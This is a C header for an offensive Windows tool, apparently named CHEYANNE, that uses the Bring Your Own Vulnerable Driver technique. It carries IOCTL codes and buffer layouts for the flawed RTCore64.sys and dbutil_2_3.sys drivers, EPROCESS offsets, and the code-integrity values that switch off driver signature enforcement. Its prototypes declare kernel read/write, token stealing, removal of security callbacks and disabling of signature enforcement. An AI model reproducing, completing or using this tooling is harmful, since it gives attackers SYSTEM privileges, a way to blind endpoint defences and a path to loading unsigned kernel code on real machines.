/*
 * byovd.h — CHEYANNE BYOVD Kernel Persistence
 * 22DIV / george wu
 *
 * Bring Your Own Vulnerable Driver — arbitrary kernel R/W
 * via signed drivers with known CVEs.
 *
 * Supported drivers:
 *   RTCore64.sys  — MSI Afterburner (CVE-2019-16098)
 *   dbutil_2_3.sys — Dell BIOS Utility (CVE-2021-21551)
 *
 * Target: Windows 11 24H2 Build 26200 (own hardware)
 */

#ifndef BYOVD_H
#define BYOVD_H

#include <windows.h>
#include <winternl.h>

/* ----------------------------------------------------------------
 * RTCore64.sys — MSI Afterburner kernel driver
 * CVE-2019-16098: arbitrary physical/virtual memory R/W via IOCTL
 * ---------------------------------------------------------------- */

#define RTCORE_DEVICE_NAME      "\\\\.\\RTCore64"
#define RTCORE_SERVICE_NAME     "RTCore64"

#define RTCORE_IOCTL_READ       0x80002048
#define RTCORE_IOCTL_WRITE      0x8000204C

#pragma pack(push, 1)
typedef struct _RTCORE_BUFFER {
    BYTE    padding_00[8];      /* 0x00 — unused padding */
    ULONGLONG address;          /* 0x08 — target kernel address */
    BYTE    padding_10[4];      /* 0x10 — unused */
    DWORD   offset;             /* 0x14 — offset from address */
    DWORD   size;               /* 0x18 — bytes to read/write (1, 2, or 4) */
    DWORD   value;              /* 0x1C — value for write, result for read */
    BYTE    padding_20[16];     /* 0x20 — unused tail */
} RTCORE_BUFFER;                /* total: 0x30 = 48 bytes */
#pragma pack(pop)

/* ----------------------------------------------------------------
 * dbutil_2_3.sys — Dell BIOS Utility driver
 * CVE-2021-21551: arbitrary memmove, Everyone ACL on device
 * ---------------------------------------------------------------- */

#define DBUTIL_DEVICE_NAME      "\\\\.\\DBUtil_2_3"
#define DBUTIL_SERVICE_NAME     "DBUtil_2_3"

#define DBUTIL_IOCTL_READ       0x9B0C1EC4
#define DBUTIL_IOCTL_WRITE      0x9B0C1EC8

#pragma pack(push, 1)
typedef struct _DBUTIL_BUFFER {
    BYTE    padding_00[8];      /* 0x00 — unused */
    ULONGLONG address;          /* 0x08 — target kernel address */
    BYTE    padding_10[8];      /* 0x10 — unused */
    ULONGLONG value;            /* 0x18 — value for write / result for read */
} DBUTIL_BUFFER;                /* total: 0x20 = 32 bytes */
#pragma pack(pop)

/* ----------------------------------------------------------------
 * EPROCESS offsets — Windows 11 24H2 Build 26200
 *
 * Verified via Windbg:
 *   dt nt!_EPROCESS UniqueProcessId
 *   dt nt!_EPROCESS ActiveProcessLinks
 *   dt nt!_EPROCESS Token
 *   dt nt!_EPROCESS ImageFileName
 * ---------------------------------------------------------------- */

#define EPROCESS_UNIQUE_PID         0x440
#define EPROCESS_ACTIVE_LINKS       0x448
#define EPROCESS_TOKEN              0x4B8
#define EPROCESS_IMAGE_FILENAME     0x5A8

/* ----------------------------------------------------------------
 * CI.dll offsets — Code Integrity
 * g_CiOptions controls Driver Signature Enforcement (DSE)
 *   0x6 = enforcing (default)
 *   0x0 = disabled
 * ---------------------------------------------------------------- */

#define CI_OPTIONS_ENFORCING        0x6
#define CI_OPTIONS_DISABLED         0x0

/* ----------------------------------------------------------------
 * Driver type enum
 * ---------------------------------------------------------------- */

typedef enum _BYOVD_DRIVER {
    DRIVER_RTCORE64 = 0,
    DRIVER_DBUTIL23 = 1,
} BYOVD_DRIVER;

/* ----------------------------------------------------------------
 * Context — holds driver state
 * ---------------------------------------------------------------- */

typedef struct _BYOVD_CTX {
    BYOVD_DRIVER    driver;
    HANDLE          hDevice;
    ULONGLONG       ntoskrnl_base;
    ULONGLONG       eprocess_system;
    wchar_t         driver_path[MAX_PATH];
    char            service_name[64];
} BYOVD_CTX;

/* ----------------------------------------------------------------
 * byovd_loader.c — driver lifecycle
 * ---------------------------------------------------------------- */

BOOL byovd_init(BYOVD_CTX *ctx, BYOVD_DRIVER driver, const wchar_t *driver_path);
BOOL byovd_load_driver(BYOVD_CTX *ctx);
BOOL byovd_open_device(BYOVD_CTX *ctx);
void byovd_unload(BYOVD_CTX *ctx);

/* ----------------------------------------------------------------
 * kernel_ops.c — kernel R/W + exploitation
 * ---------------------------------------------------------------- */

BOOL kread32(BYOVD_CTX *ctx, ULONGLONG addr, DWORD *out);
BOOL kread64(BYOVD_CTX *ctx, ULONGLONG addr, ULONGLONG *out);
BOOL kwrite32(BYOVD_CTX *ctx, ULONGLONG addr, DWORD val);
BOOL kwrite64(BYOVD_CTX *ctx, ULONGLONG addr, ULONGLONG val);

BOOL kread_buf(BYOVD_CTX *ctx, ULONGLONG addr, void *buf, DWORD size);

BOOL kernel_find_ntoskrnl(BYOVD_CTX *ctx);
BOOL kernel_find_system_eprocess(BYOVD_CTX *ctx);
BOOL kernel_find_eprocess_by_pid(BYOVD_CTX *ctx, DWORD pid, ULONGLONG *eprocess_out);
BOOL kernel_steal_token(BYOVD_CTX *ctx, DWORD target_pid);
BOOL kernel_remove_callbacks(BYOVD_CTX *ctx);
BOOL kernel_dse_disable(BYOVD_CTX *ctx);
BOOL kernel_dse_restore(BYOVD_CTX *ctx);

#endif
